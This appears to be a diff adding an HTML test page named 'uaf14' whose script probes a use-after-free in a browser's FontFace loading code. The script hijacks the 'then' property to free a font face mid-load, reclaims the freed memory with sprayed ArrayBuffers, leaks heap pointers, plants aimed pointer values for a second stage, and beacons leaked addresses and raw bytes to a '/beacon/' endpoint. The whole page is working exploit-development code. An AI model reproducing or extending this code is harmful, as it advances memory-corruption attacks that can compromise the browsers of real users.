@@ -1,0 +1,89 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>uaf14</title>
+<script>
+/* Aim m_clients at (leaked impl pointer + KOFF*0x10) and see whether the engine's
+   addClient lands inside a buffer we own.  Stage 1 leaks; stage 2 frees a second
+   face and installs the aimed template; the diff finds engine writes in our data. */
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+m+'?t='+Date.now(),false);x.send(null);}catch(e){}}
+var KOFF = 5;
+var K=8, SIZE=192, styleEl=null, firedHere=false, stage=0, leaked={p58:null,p68:null,snap:[]};
+function hex(v){return ('0' + v.toString(16)).slice(-2);}
+function rd64(u8,off){var v=0,mul=1;for(var i=0;i<8;i++){v+=u8[off+i]*mul;mul*=256;}return v;}
+function wr64(u8,off,v){for(var i=0;i<8;i++){u8[off+i]=v%256;v=Math.floor(v/256);}}
+function setupFace(name, css){
+  styleEl = document.createElement('style');
+  styleEl.textContent = css;
+  document.head.appendChild(styleEl);
+  var A = new FontFace(name, 'local(Helvetica)', { unicodeRange: 'U+0041' });
+  document.fonts.add(A); void A.loaded; window.__alive.push(A);
+}
+function installGetter(){
+  firedHere = false;
+  Object.defineProperty(FontFace.prototype, 'then', {
+    configurable: true,
+    get: function(){
+      if (firedHere) return undefined;
+      firedHere = true;
+      if (styleEl) styleEl.remove();
+      try { document.fonts.delete(this); } catch (e) {}
+      document.body.offsetHeight;
+      window.__map = [];
+      for (var k = 0; k < K; k++) {
+        var v = new Uint8Array(new ArrayBuffer(SIZE));
+        if (stage === 1) {
+          wr64(v, 0x68, leaked.p68v);
+          wr64(v, 0x58, leaked.p58v + KOFF * 0x10);
+          var snap = new Uint8Array(SIZE); snap.set(v);
+          window.__map.push({ view: v, snap: snap });
+        } else {
+          window.__map.push({ view: v, snap: null });
+        }
+      }
+      try { document.fonts.check('1em s0'); } catch (e) {}
+      return undefined;
+    },
+    set: function(){}
+  });
+}
+function start(){
+  window.__alive = []; stage = 0;
+  setupFace('f0', "@font-face { font-family: s0; src: local(Arial); unicode-range: U+0042; }");
+  installGetter();
+  b('U14-' + KOFF + '-SETUP');
+  document.fonts.load('1em f0, s0', 'AB').then(function(){ b('U14-' + KOFF + '-S1-RESOLVED'); }, function(){ b('U14-' + KOFF + '-S1-REJECTED'); });
+  setTimeout(scan1, 120);
+}
+function scan1(){
+  var m = window.__map || [], best = -1, nz = 0;
+  for (var i = 0; i < m.length; i++) {
+    var v = m[i].view, n = 0;
+    for (var j = 0; j < v.length; j++) if (v[j] !== 0) n++;
+    if (n > nz) { nz = n; best = i; }
+  }
+  if (best < 0) { b('U14-' + KOFF + '-S1-CLEAN'); return; }
+  var v = m[best].view;
+  leaked.p58v = rd64(v, 0x58); leaked.p68v = rd64(v, 0x68);
+  var s=''; for (var j=0;j<v.length;j++) if (v[j]!==0) s += hex(v[j]);
+  b('U14-' + KOFF + '-S1-HIT-n' + nz + '-p58-' + leaked.p58v.toString(16) + '-p68-' + leaked.p68v.toString(16) + '-raw-' + s);
+  stage = 1;
+  setupFace('f1', "@font-face { font-family: s1; src: local(Arial); unicode-range: U+0043; }");
+  installGetter();
+  b('U14-' + KOFF + '-S2-SETUP');
+  document.fonts.load('1em f1, s1', 'AB').then(function(){ b('U14-' + KOFF + '-S2-RESOLVED'); }, function(){ b('U14-' + KOFF + '-S2-REJECTED'); });
+  setTimeout(diff, 400);
+}
+function diff(){
+  var m = window.__map || [];
+  for (var i = 0; i < m.length; i++) {
+    var v = m[i].view, sn = m[i].snap; if (!sn) continue;
+    var s = '';
+    for (var j = 0; j < v.length; j++) {
+      if (v[j] !== sn[j]) { var seg = ''; for (var q = 0; q < 8 && j+q < v.length; q++) seg += hex(v[j+q]); s += 'a' + j + '=' + seg + ';'; j += 7; }
+    }
+    if (s) b('U14-' + KOFF + '-DIFF-b' + i + '-' + s);
+  }
+  b('U14-' + KOFF + '-END-alive-' + (firedHere?1:0));
+}
+function run(){ start(); }
+if (document.readyState === 'complete' || document.readyState === 'interactive') setTimeout(run, 0);
+else document.addEventListener('DOMContentLoaded', run);
+</script></head><body><p>uaf14</p></body></html>
